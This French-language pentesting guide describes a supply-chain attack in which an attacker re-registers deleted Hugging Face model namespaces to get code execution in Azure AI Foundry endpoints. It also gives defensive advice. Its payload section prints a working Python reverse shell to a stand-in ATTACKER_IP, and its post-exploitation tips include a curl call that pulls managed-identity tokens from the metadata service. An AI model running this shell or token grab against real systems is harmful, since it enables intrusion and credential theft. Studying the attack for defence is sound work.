# Azure - AI Foundry Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## Scénario

- Le Model Catalog d'Azure AI Foundry inclut de nombreux modèles Hugging Face (HF) pour un déploiement en un clic.
- Les identifiants de modèle HF sont Author/ModelName. Si un auteur/org HF est supprimé, n'importe qui peut ré-enregistrer cet author et publier un modèle avec le même ModelName au legacy path.
- Les pipelines et catalogs qui récupèrent le modèle uniquement par nom (pas de commit pinning/integrity) résoudront vers des repos contrôlés par un attaquant. Quand Azure déploie le modèle, le loader code peut s'exécuter dans l'endpoint environment, accordant RCE avec les permissions de cet endpoint.

Cas courants de takeover HF :
- Ownership deletion : Old path 404 until takeover.
- Ownership transfer : Old path 307 to the new author while old author exists. If the old author is later deleted and re-registered, the redirect breaks and the attacker’s repo serves at the legacy path.

## Identification des namespaces réutilisables (HF)
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>        # 200 exists, 404 deleted/available

# Check model path
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 -> redirect (transfer case), 404 -> deleted until takeover
```
## Flux d'attaque de bout en bout contre Azure AI Foundry

1) Dans le Model Catalog, trouvez des modèles HF dont les auteurs originaux ont été supprimés ou transférés (old author removed) sur HF.  
2) Réenregistrez l'auteur abandonné sur HF et recréez le ModelName.  
3) Publiez un repo malveillant contenant du loader code qui s'exécute lors de l'import ou nécessite trust_remote_code=True.  
4) Déployez le legacy Author/ModelName depuis Azure AI Foundry. La plateforme récupère le repo de l'attaquant ; le loader s'exécute à l'intérieur du container/VM de l'endpoint Azure, conduisant à une RCE avec les permissions de l'endpoint.

Exemple de payload fragment exécuté lors de l'import (à titre de démonstration uniquement) :
```python
# __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # or powershell on Windows images

if os.environ.get("AZUREML_ENDPOINT","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Remarques
- Les déploiements AI Foundry qui intègrent HF clonent généralement et importent des modules de repo référencés par la config du modèle (p. ex., auto_map), ce qui peut déclencher l'exécution de code. Certains chemins nécessitent trust_remote_code=True.
- L'accès correspond généralement aux permissions de managed identity/service principal de l'endpoint. Considérez-le comme un initial access foothold pour l'accès aux données et le mouvement latéral au sein d'Azure.

## Post-Exploitation Tips (Azure Endpoint)

- Enumérez les variables d'environnement et les endpoints MSI à la recherche de tokens:
```bash
# Azure Instance Metadata Service (inside Azure compute)
curl -H "Metadata: true" \
"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```
- Vérifiez le stockage monté, les artefacts de modèle et les services Azure accessibles avec le jeton acquis.
- Envisagez une persistance en laissant des artefacts de modèle empoisonnés si la plateforme récupère à nouveau depuis HF.

## Recommandations défensives pour les utilisateurs d'Azure AI Foundry

- Épingler les modèles par commit lors du chargement depuis HF:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- Répliquer les modèles HF vérifiés dans un registre interne de confiance et déployer depuis celui-ci.
- Scanner en continu les codebases et defaults/docstrings/notebooks pour des Author/ModelName codés en dur qui sont supprimés/transférés ; mettre à jour ou fixer.
- Valider l'existence de l'auteur et la provenance du modèle avant le déploiement.

## Heuristiques de reconnaissance (HTTP)

- Auteur supprimé : la page de l'auteur 404 ; chemin legacy du modèle 404 jusqu'à une prise de contrôle.
- Modèle transféré : chemin legacy 307 vers le nouvel auteur pendant que l'ancien auteur existe ; si l'ancien auteur est ensuite supprimé et réenregistré, le chemin legacy renverra du contenu de l'attaquant.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## Références croisées

- Voir la méthodologie plus large et les notes sur la supply-chain :

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## Références

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
